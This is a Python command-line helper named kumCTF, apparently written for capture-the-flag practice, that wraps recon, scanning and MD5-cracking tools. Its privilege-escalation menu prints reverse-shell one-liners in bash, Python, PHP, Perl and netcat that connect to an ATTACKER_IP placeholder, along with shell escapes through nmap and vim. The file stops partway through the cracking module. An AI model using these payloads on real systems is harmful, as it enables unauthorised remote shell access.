#fonksiyonlarda çalışmayanlar var john buga giriyor ona bakılacak, derlemeler ve kod mimarisi düzeltilecek
#geri gitme ve ctrlc basınca uygulama içerisinde kalma her fonksiyona gelecek
import subprocess
import os
import re
from rich.console import Console
from rich.table import Table
from rich.text import Text
from rich import print
from rich import box
from rich.panel import Panel
import pyfiglet

console = Console()

def clear_terminal():
    os.system("clear")

def run_whois():
    value_error_count = 0

    while value_error_count < 3:
        clear_terminal()
        target = console.input("Enter the target domain or IP for whois lookup:\n[green]kumCTF[/green]>")

        if not target:
            value_error_count += 1
            console.print(
                f"[bold red]Invalid input![/bold red] Please provide a valid domain or IP. Attempts remaining: {3 - value_error_count}")
            continue
        try:
            result = subprocess.run(["whois", target], capture_output=True, text=True, check=True)
            console.print(f"[green]WHOIS lookup result for {target}:[/green]")
            print(result.stdout)
            break
        except subprocess.CalledProcessError as e:
            back = console.input(f"""[bold red]Error:[/bold red] An error occurred while running whois: {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                information_gathering()
                break
            value_error_count += 1
        except Exception as e:
            back = console.input(f"""[bold red]Unexpected error:[/bold red] {e}\n
                Press (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>
                """)
            if back == 'b':
                clear_terminal()
                information_gathering()
                break
            value_error_count += 1

    if value_error_count >= 3:
        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
        exit()

    return

def run_ping():
    value_error_count = 0

    while value_error_count < 3:
        clear_terminal()
        target = console.input("Enter the IP for pinging:\n[green]kumCTF[/green]>")

        if not target:
            value_error_count += 1
            console.print(
                f"[bold red]Invalid input![/bold red] Please provide a valid IP. Attempts remaining: {3 - value_error_count}")
            continue

        try:
            process = subprocess.Popen(
                ["ping", "-c", "4", target],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            stdout, stderr = process.communicate()

            # Hata mesajı varsa, gösterelim
            if stderr:
                console.print(f"[bold red]Error:[/bold red] {stderr.strip()}")
                value_error_count += 1
                continue

            for line in stdout.splitlines():
                console.print(line.strip())
            process.wait()
            break

        except subprocess.CalledProcessError as e:
            back = console.input(f"""[bold red]Error:[/bold red] An error occurred while running ping: {e}\n
                Press (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>
                """)
            if back == 'b':
                clear_terminal()
                return
            value_error_count += 1

        except Exception as e:
            back = console.input(f"""[bold red]Unexpected error:[/bold red] {e}\n
                Press (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>
                """)
            if back == 'b':
                clear_terminal()
                information_gathering()
                break
            value_error_count += 1

    if value_error_count >= 3:
        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
        exit()

    return


def run_dig():
    value_error_count = 0

    while value_error_count < 3:
        clear_terminal()
        target = console.input("Enter the target domain:\n[green]kumCTF[/green]>")

        if not target:
            value_error_count += 1
            console.print(
                f"[bold red]Invalid input![/bold red] Please provide a valid domain. Attempts remaining: {3 - value_error_count}")
            continue

        try:
            result = subprocess.run(["dig", target], text=True, capture_output=True, check=True)
            console.print(f"[bold green]Dig Result for {target}:[/bold green]\n")
            console.print(result.stdout)
            break

        except FileNotFoundError:
            console.print("\n[bold red]Error:[/bold red] Couldn't find 'dig' in your system, please make sure it is installed.")
            break
        except subprocess.CalledProcessError as e:
            back = console.input(f"""[bold red]Error while running dig:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                information_gathering()
                break
            value_error_count += 1
        except Exception as e:
            back = console.input(f"""[bold red]Unexpected error:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                information_gathering()
                break
            value_error_count += 1

    if value_error_count >= 3:
        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
        exit()
    return

def run_nslookup():
    value_error_count = 0

    while value_error_count < 3:
        clear_terminal()
        target = console.input("Target IP for reverse DNS lookup:\n[green]kumCTF>[/green] ")

        if not target:
            value_error_count += 1
            console.print(
                f"[bold red]Invalid input![/bold red] Please provide a valid IP. Attempts remaining: {3 - value_error_count}")
            continue

        try:
            result = subprocess.run(["nslookup", target], text=True, capture_output=True, check=True)
            console.print(f"[bold green]NSLookup Result for {target}:[/bold green]\n")
            console.print(result.stdout)
            break
        except FileNotFoundError:
            back = console.input("""[bold red]Error:[/bold red] Couldn't find 'nslookup' in your system, please make sure it is installed.\nPress (b) to go back\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                information_gathering()
                break
        except subprocess.CalledProcessError as e:
            back = console.input(f"""[bold red]Error while running nslookup:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                information_gathering()
                break
            value_error_count += 1
        except Exception as e:
            back = console.input(f"""[bold red]Unexpected error:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                information_gathering()
                break
            value_error_count += 1

    if value_error_count >= 3:
        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
        exit()

    return


def information_gathering():

    console.print(
        Panel(
            "Information Gathering is the process of collecting and analyzing information about a target system. This can include identifying open ports, services, DNS records, and other crucial data.",
            title="kumCTF - Info Gathering",
            box=box.SQUARE,
            border_style="green",
            style="bold white",
            padding=(1, 2),
        )
    )

    table = Table(title="Select a Tool", box=box.HEAVY_EDGE, border_style="cyan",show_lines=True)
    table.add_column("Tool", style="bold green")
    table.add_column("Description", style="dim")

    table.add_row("1-ping", "Tests network connectivity by sending ICMP echo requests to a target system.")
    table.add_row("2-nslookup", "Queries DNS records to resolve domain names to IP addresses.")
    table.add_row("3-dig", "A flexible DNS lookup tool used for querying DNS records with detailed output")
    table.add_row("4-whois", "Retrieves domain registration information.")

    console.print(table)

    value_error_count = 0
    choice_error_count = 0
    while True:
        try:
            tool = int(console.input("\nPlease choose a tool (1-4) or (5) back:\n[green]kumCTF[/green]>"))
        except ValueError:
            console.print("[red]Value error, please enter a number between (1-4)![/red]\n[green]kumCTF[/green]>")
            value_error_count += 1
            if value_error_count >= 3:
                console.print("[red]Too many invalid values.Exiting...[/red]")
                exit()
            continue

        match tool:
            case 1:
                console.print("\nRunning [cyan]Ping[/cyan]...")
                run_ping()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    information_gathering()
                else:
                    back_again = console.input("Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        information_gathering()
            case 2:
                console.print("\nRunning [cyan]Nslookup[/cyan]...")
                run_nslookup()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    information_gathering()
                else:
                    back_again = console.input("Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        information_gathering()
            case 3:
                console.print("\nRunning [cyan]Dig[/cyan]...")
                run_dig()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    information_gathering()
                else:
                    back_again = console.input("Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        information_gathering()
            case 4:
                console.print("\nRunning [cyan]Whois[/cyan]...")
                run_whois()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    information_gathering()
                else:
                    back_again = console.input("Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        information_gathering()
            case 5:
                print("\nGoing back...")
                clear_terminal()
                main_menu()
            case _:
                console.print("[red]Invalid choice, try again![/red]")
                choice_error_count += 1
                if choice_error_count >= 3:
                    console.print("[red]Too many invalid choices. Exiting...[/red]")
                    exit()
                continue

def scan_ports_with_rustscan():
    value_error_count = 0

    while value_error_count < 3:
        clear_terminal()
        target = console.input("Please enter the target IP:\n[green]kumCTF[/green]>")

        if not target:
            value_error_count += 1
            console.print(
                f"[bold red]Invalid input![/bold red] Please provide a valid IP. Attempts remaining: {3 - value_error_count}")
            continue

        console.print(f"Starting fast port scan for [green]{target}[/green]...\n")

        command = [
            "rustscan",
            "-a", target,
            "--ulimit", "5000"
        ]

        try:
            result = subprocess.run(command, capture_output=True, text=True)

            import re
            output = result.stdout

            clean_output = re.sub(r'\x1b\[[0-9;]*m', '', output)

            lines = clean_output.splitlines()

            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
            console.print("[bold cyan]🔍 RustScan Results - Target: [green]{}[/green][/bold cyan]".format(target))
            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

            # Önemli bilgileri çıkar ve göster
            open_ports = []
            for line in lines:
                if "Open" in line and not "Script" in line:
                    port = line.strip()
                    open_ports.append(port)
                    console.print(f"[bold green]✅ {port}[/bold green]")

            if not open_ports:
                console.print("[yellow]⚠️ Couldn't find an open port![/yellow]")

            if result.stderr:
                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")

            break

        except subprocess.CalledProcessError as e:
            back = console.input(
                f"""[bold red]Error:[/bold red] An error occurred while running rustscan: {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                scanning()
                break
            value_error_count += 1

        except Exception as e:
            back = console.input(
                f"""[bold red]Unexpected error:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                scanning()
                break
            value_error_count += 1

    if value_error_count >= 3:
        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
        exit()

def detailed_nmap_scan():
    clear_terminal()
    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
    console.print("[bold cyan]🔍 Detailed Nmap Scanner[/bold cyan]")
    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

    target = console.input("[yellow]Please enter the target IP:[/yellow]\n[green]kumCTF[/green]>")
    if not target:
        console.print("[bold red]Error:[/bold red] Target IP is required!")
        return

    ports = console.input(
        "[yellow]Please enter the ports (e.g. 80,443) or leave empty to scan all ports:[/yellow]\n[green]kumCTF[/green]>")

    command = [
        "nmap", "-sC",
        "-sV", "-sS",
        "-O"
    ]
    if ports:
        command.extend(["-p", ports])
    command.append(target)

    console.print(f"[bold green]Starting detailed Nmap scan for [cyan]{target}[/cyan]...[/bold green]")
    console.print("[yellow]This may take some time depending on the target and ports selected.[/yellow]")

    try:
        #ilerleme cubuğu mu neydi o
        with console.status("[bold green]Scanning in progress...[/bold green]", spinner="dots"):

            result = subprocess.run(command, text=True, capture_output=True)

            output = result.stdout

            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
            console.print(f"[bold cyan]📊 Scan Results for [green]{target}[/green][/bold cyan]")
            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

            lines = output.splitlines()
            host_up = False
            port_section = False
            service_section = False
            os_section = False

            for line in lines:
                if "Host is up" in line:
                    host_up = True
                    latency = line.split("(")[1].split(")")[0] if "(" in line else "unknown"
                    console.print(f"[bold green]✅ Host is up[/bold green] - Latency: {latency}")

                elif "/tcp" in line or "/udp" in line:
                    if not port_section:
                        port_section = True
                        console.print("\n[bold cyan]🚪 Open Ports:[/bold cyan]")

                    parts = line.split()
                    if len(parts) >= 3:
                        port = parts[0]
                        state = parts[1]
                        service = ' '.join(parts[2:])

                        if "open" in state:
                            console.print(f"[bold green]🟢 {port} - {service}[/bold green]")
                        elif "filtered" in state:
                            console.print(f"[yellow]🟠 {port} - {service}[/yellow]")
                        else:
                            console.print(f"[dim]{port} - {service}[/dim]")

                elif "Service Info:" in line:
                    if not service_section:
                        service_section = True
                        console.print("\n[bold cyan]🔧 Service Details:[/bold cyan]")
                    console.print(f"[cyan]{line}[/cyan]")

                elif "OS detection" in line or "OS details:" in line:
                    if not os_section:
                        os_section = True
                        console.print("\n[bold cyan]💻 Operating System Detection:[/bold cyan]")
                    console.print(f"[magenta]{line}[/magenta]")

                elif line.startswith("|") and ":" in line:
                    key = line.split(":", 1)[0] + ":"
                    value = line.split(":", 1)[1]
                    console.print(f"[yellow]{key}[/yellow]{value}")

            for line in lines:
                if "Nmap done:" in line:
                    console.print(f"\n[cyan]{line}[/cyan]")

            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

            if not host_up:
                console.print("[bold red]⚠️ Host appears to be down or not responding.[/bold red]")

            if result.stderr:
                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")

    except KeyboardInterrupt:
        console.print("[bold yellow]Scan interrupted by user.[/bold yellow]")
        return
    except Exception as e:
        console.print(f"[bold red]An error occurred: {e}[/bold red]")

def nmap_service_deteciton():
    clear_terminal()
    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
    console.print("[bold cyan]🔍 Service & Version Scanner[/bold cyan]")
    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
    console.print("Detects the service & version on the target IP.")

    target = console.input("[yellow]Please enter the target IP:[/yellow]\n[green]kumCTF[/green]>")

    if not target:
        console.print("[bold red]Error:[/bold red] Target IP is required!")
        return

    ports = console.input(
        "[yellow]Please enter the ports (like 22,80) if you don't it will scan all of the ports:[/yellow]\n[green]kumCTF[/green]>")

    command = ["nmap", "-sV"]

    if ports:
        ports = ",".join([port.strip() for port in ports.split(',') if port.strip()])
        command.extend(["-p", ports])
    else:
        command.append("-p-")

    command.append(target)

    console.print(f"[bold green]Running service & version detection on [cyan]{target}[/cyan]...[/bold green]")
    if not ports:
        console.print("[yellow]Scanning all ports. This may take a while...[/yellow]")

    try:
        with console.status("[bold green]Scanning in progress...[/bold green]", spinner="dots"):
            result = subprocess.run(command, text=True, capture_output=True)

            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
            console.print(f"[bold cyan]📊 Service Detection Results for [green]{target}[/green][/bold cyan]")
            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

            lines = result.stdout.splitlines()
            port_table_started = False
            found_services = False

            for line in lines:
                if "Host is up" in line:
                    latency = line.split("(")[1].split(")")[0] if "(" in line else "unknown"
                    console.print(f"[bold green]✅ Host is up[/bold green] - Latency: {latency}")

                elif "PORT" in line and "STATE" in line and "SERVICE" in line:
                    port_table_started = True
                    console.print("\n[bold cyan]🚪 Detected Services:[/bold cyan]")
                    console.print(f"[bold]{'PORT':<10} {'STATE':<10} {'SERVICE':<15} {'VERSION':<}[/bold]")

                elif port_table_started and ("/tcp" in line or "/udp" in line):
                    found_services = True
                    parts = line.split(None, 3)  # Split into max 4 parts

                    if len(parts) >= 3:
                        port = parts[0]
                        state = parts[1]
                        service = parts[2]
                        version = parts[3] if len(parts) > 3 else ""

                        if state == "open":
                            console.print(f"[green]{port:<10} {state:<10} {service:<15} {version:<}[/green]")
                        elif state == "filtered":
                            console.print(f"[yellow]{port:<10} {state:<10} {service:<15} {version:<}[/yellow]")
                        else:
                            console.print(f"[dim]{port:<10} {state:<10} {service:<15} {version:<}[/dim]")

            for line in lines:
                if "service detection performed" in line.lower():
                    console.print(f"\n[cyan]{line}[/cyan]")

            if not found_services:
                console.print("[yellow]⚠️ No open services detected.[/yellow]")

            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

            if result.stderr:
                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")

    except KeyboardInterrupt:
        console.print("[bold yellow]Scan interrupted by user.[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]An error occurred: {e}[/bold red]")


def run_netdiscover():
    clear_terminal()
    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
    console.print("[bold cyan]🔍 Network Discovery Scanner[/bold cyan]")
    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

    network_range = console.input(
        "[yellow]Enter the network range (e.g., 10.0.2.0/24):[/yellow]\n[green]kumCTF[/green]> ")

    if not network_range:
        console.print("[bold red]Error:[/bold red] Network range is required!")
        return

    console.print(f"[bold green]Running network discovery on [cyan]{network_range}[/cyan]...[/bold green]")
    console.print("[yellow]Press Ctrl+C to stop the scan at any time.[/yellow]\n")

    process = None
    hosts_found = []

    try:
        command = ["sudo", "netdiscover", "-r", network_range, "-P"]

        console.print("[bold]IP Address      MAC Address        Vendor[/bold]")
        console.print("[dim]──────────────────────────────────────────────────[/dim]")

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   bufsize=1, universal_newlines=True)

        for line in process.stdout:
            line = line.strip()

            if not line or "Currently scanning" in line or "--------------------------------------------------------" in line:
                continue

            parts = line.split()
            if len(parts) >= 5 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0]):
                ip_addr = parts[0]
                mac_addr = parts[1]
                vendor = ' '.join(parts[4:]) if len(parts) > 4 else "Unknown"

                hosts_found.append((ip_addr, mac_addr, vendor))

                console.print(f"[green]{ip_addr:<15} [blue]{mac_addr:<18} [yellow]{vendor}[/yellow]")

        process.stdout.close()
        process.wait()

        console.print("\n[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
        console.print(f"[bold green]✅ Network discovery completed![/bold green]")
        console.print(f"[cyan]Total hosts found: {len(hosts_found)}[/cyan]")
        console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️ Network discovery was interrupted by the user.[/yellow]")
        clear_terminal()
        if process:
            process.terminate()
    except Exception as e:
        console.print(f"[bold red]An error occurred: {e}[/bold red]")
        if process:
            process.terminate()

    scanning()

def scanning():
    console.print(
        Panel(
            """Scanning is the process of identifying live hosts, open ports, and running services on a target system or network.
It helps to gather detailed technical information that can be used for further analysis or exploitation.\nThis part is beautified for you to understand more easily hope you like it.""",
            title="[green]kumCTF[/green] - Scanning",
            box=box.SQUARE,
            border_style="blue",
            style="bold white",
            padding=(1, 2),
        )
    )

    table = Table(title="Select a Tool", box=box.HEAVY_EDGE, border_style="blue",show_lines=True)
    table.add_column("Tool", style="blue")
    table.add_column("Description", style="dim")

    table.add_row("1-Netdiscover", "Quickly discover live hosts on a local network using ARP requests.")
    table.add_row("2-Rustscan", "Extremely fast port scanner to identify open ports efficiently.")
    table.add_row("3-Nmap Detailed Scan", "Perform SYN scan, service and version detection, script scanning, and OS detection for full analysis.")
    table.add_row("4-Nmap Server & Version Deteciton", "Identify running services and their versions on open ports.")

    console.print(table)

    value_error_count = 0
    choice_error_count = 0
    while True:
        try:
            tool = int(console.input("\nPlease choose a tool (1-4) or (5) back:\n[green]kumCTF[/green]>"))
        except ValueError:
            console.print("[red]Value error, please enter a number between (1-4)![/red]\n[green]kumCTF[/green]>")
            value_error_count += 1
            if value_error_count >= 3:
                console.print("[red]Too many invalid values.Exiting...[/red]")
                exit()
            continue

        match tool:
            case 1:
                console.print("\nRunning [cyan]Netdiscover[/cyan]...")
                run_netdiscover()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    scanning()
                else:
                    back_again = console.input(
                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        scanning()
            case 2:
                console.print("\nRunning [blue]Rustscan[/blue]...")
                scan_ports_with_rustscan()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    scanning()
                else:
                    back_again = console.input(
                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        scanning()
            case 3:
                console.print("\nRunning [blue]Detailed Nmap Scan[/blue]...")
                detailed_nmap_scan()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    scanning()
                else:
                    back_again = console.input(
                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        scanning()
            case 4:
                console.print("\nRunning [blue]Nmap version & service[/blue]...")
                nmap_service_deteciton()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    scanning()
                else:
                    back_again = console.input(
                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        scanning()
            case 5:
                print("\nGoing back...")
                clear_terminal()
                main_menu()
            case _:
                console.print("[red]Invalid choice, try again![/red]")
                choice_error_count += 1
                if choice_error_count >= 3:
                    console.print("[red]Too many invalid choices. Exiting...[/red]")
                    exit()
                continue


def privilege_escalation():
    console.print(
        Panel(
            "[green]kumCTF[/green] recommends manual privilege escalation using custom shell or reverse shell payloads\n"
            "The following payloads are collected from:\n"
            "- GTFOBins (https://gtfobins.github.io)\n"
            "- PentestMonkey Reverse Shell Cheatsheet (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n"
            "For detailed escalation techniques, refer to the original sources.",
            title="[green]kumCTF[/green] - Privilege Escalation Section",
            box=box.SQUARE,
            border_style="yellow",
            style="bold white",
            padding=(1, 2),
        )
    )

    table = Table(
        title="Choose a Payload",
        box=box.HEAVY_EDGE,
        border_style="yellow",
        show_lines=True,
    )

    table.add_column("Payload Names", style="dim")
    table.add_column("Codes")

    table.add_row(
        "Bash Reverse Shell",
        "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
    )

    table.add_row(
        "Python Reverse Shell",
        "python3 -c 'import socket,subprocess,os;\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n"
        "s.connect((\"ATTACKER_IP\",PORT));\n"
        "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\n"
        "import pty; pty.spawn(\"/bin/bash\")'"
    )

    table.add_row(
        "PHP Reverse Shell",
        "<?php\n"
        "exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\");\n"
        "?>"
    )

    table.add_row(
        "Nmap Interactive Shell",
        "nmap --interactive\n"
        "nmap> !sh"
    )

    table.add_row(
        "Perl Reverse Shell",
        "perl -e 'use Socket;\n"
        "$i=\"ATTACKER_IP\"; $p=PORT;\n"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\n"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){\n"
        "  open(STDIN,\"&S\"); open(STDOUT,\"&S\"); open(STDERR,\"&S\");\n"
        "  exec(\"/bin/sh -i\");\n"
        "};'"
    )

    table.add_row(
        "Netcat Reverse Shell",
        "nc -e /bin/sh ATTACKER_IP PORT"
    )

    table.add_row(
        "Python Shell",
        "python -c 'import os; os.system(\"/bin/sh\")'"
    )

    table.add_row(
        "Vim Shell",
        "vim -c ':!/bin/sh'"
    )

    console.print(table)
    back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
    if back != 'b':
        back_again = console.input("Press [yellow](b)[/yellow] or the system will [red]kick[/red] you!!\n[green]kumCTF[/green]>")
        if back_again != 'b':
            exit()
        else:
            clear_terminal()
            main_menu()
    else:
        clear_terminal()
        main_menu()

def john_crack_md5():
    value_error_count = 0
    timeout = 60  # Timeout süresi (saniye cinsinden)

    while value_error_count < 3:
        clear_terminal()
        hash_file = console.input("Please enter the path to the hash file:\n[green]kumCTF[/green]>")

        if not hash_file or not os.path.isfile(hash_file):
            value_error_count += 1
            console.print(f"[bold red]Invalid file path![/bold red] Please provide a valid file path. Attempts remaining: {3 - value_error_count}")
            continue

        console.print(f"Starting John the Ripper against MD5 hash file [green]{hash_file}[/green]...\n")

        command = [
            "john",
            "--format=raw-md5",
            hash_file
        ]

        try:
            console.print("[bold yellow]Running John the Ripper...[/bold yellow]")
            result = subprocess.run(command, capture_output=True, text=True, timeout=timeout)

            # Output header
            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
            console.print(f"[bold cyan]🔑 John the Ripper Results - Hash File: [green]{hash_file}[/green][/bold cyan]")
            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
            console.print(result.stdout)

            # Check for cracked passwords
            show_command = ["john", "--show", "--format=raw-md5", hash_file]
            show_result = subprocess.run(show_command, capture_output=True, text=True)

            if show_result.stdout:
                for line in show_result.stdout.splitlines():
                    if line and not line.startswith('0') and ":" in line:
                        console.print(f"[bold green]✅ {line}[/bold green]")
            else:
                console.print("[yellow]⚠️ No passwords cracked yet![/yellow]")

            if result.stderr:
                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")

            break  # If everything goes well, exit loop

        except subprocess.TimeoutExpired:
            console.print("[bold red]Error:[/bold red] The process timed out. Try again with a smaller hash file or increase the timeout.")
            value_error_count += 1

        except subprocess.CalledProcessError as e:
            console.print(f"[bold red]Error:[/bold red] An error occurred: {e}")
            value_error_count += 1

        except Exception as e:
            console.print(f"[bold red]Unexpected error:[/bold red] {e}")
            value_error_count += 1

    if value_error_count >= 3:
        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
        exit()



def hashcat_crack_md5():
    value_error_count = 0

    while value_error_count < 3:
        clear_terminal()
        hash_file = console.input("Please enter the path to the hash file:\n[green]kumCTF[/green]>")

        if not hash_file or not os.path.isfile(hash_file):
            value_error_count += 1
            console.print(
                f"[bold red]Invalid file path![/bold red] Please provide a valid file path. Attempts remaining: {3 - value_error_count}")
            continue

        wordlist = console.input("Please enter the path to the wordlist file:\n[green]kumCTF[/green]>")

        if not wordlist or not os.path.isfile(wordlist):
            value_error_count += 1
            console.print(
                f"[bold red]Invalid wordlist path![/bold red] Please provide a valid wordlist path. Attempts remaining: {3 - value_error_count}")
            continue

        console.print(
            f"Starting Hashcat against MD5 hash file [green]{hash_file}[/green] with wordlist [green]{wordlist}[/green]...\n")

        command = [
            "hashcat",
            "-m", "0",
            "-a", "0",
            hash_file,
            wordlist,
            "--force"
        ]

        try:
            console.print("[bold yellow]Running Hashcat...[/bold yellow]")
            result = subprocess.run(command, capture_output=True, text=True)

            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
            console.print("[bold cyan]🔑 Hashcat Results - Hash File: [green]{}[/green][/bold cyan]".format(hash_file))
            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")

            console.print(result.stdout)

            console.print("[bold yellow]Displaying cracked passwords:[/bold yellow]")
            show_command = ["hashcat", "-m", "0", "--show", hash_file]
            show_result = subprocess.run(show_command, capture_output=True, text=True)

            cracked_count = 0
            if show_result.stdout:
                for line in show_result.stdout.splitlines():
                    if line and ":" in line:
                        console.print(f"[bold green]✅ {line}[/bold green]")
                        cracked_count += 1

            if cracked_count == 0:
                console.print("[yellow]⚠️ No passwords cracked yet![/yellow]")

            if result.stderr:
                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")

            break

        except subprocess.CalledProcessError as e:
            back = console.input(
                f"""[bold red]Error:[/bold red] An error occurred while running Hashcat: {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                password_cracker()
                break
            value_error_count += 1

        except Exception as e:
            back = console.input(
                f"""[bold red]Unexpected error:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
            if back == 'b':
                clear_terminal()
                password_cracker()
                break
            value_error_count += 1

    if value_error_count >= 3:
        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
        exit()

def password_cracker():
    console.print(
        Panel(
            "This module allows you to crack MD5 hashes using a wordlist.\n"
            "MD5 is a widely used cryptographic hash function that produces a 128-bit hash value,\n"
            "but it is considered weak by modern security standards.\n\n"
            "You can use this tool to attempt to recover plaintext values from MD5 hashes\n"
            "using a dictionary attack (wordlist).\n\n"
            "[yellow]Note:[/yellow] This tool primarily works with MD5 hashes. The main purpose is to demonstrate\n"
            "password cracking with common tools.",
            title="[bold green]kumCTF[/bold green] - Hash Cracker Module",
            box = box.SQUARE,
            subtitle="Learn about password cracking techniques",
            border_style="purple",
            padding=(1, 2)
        )
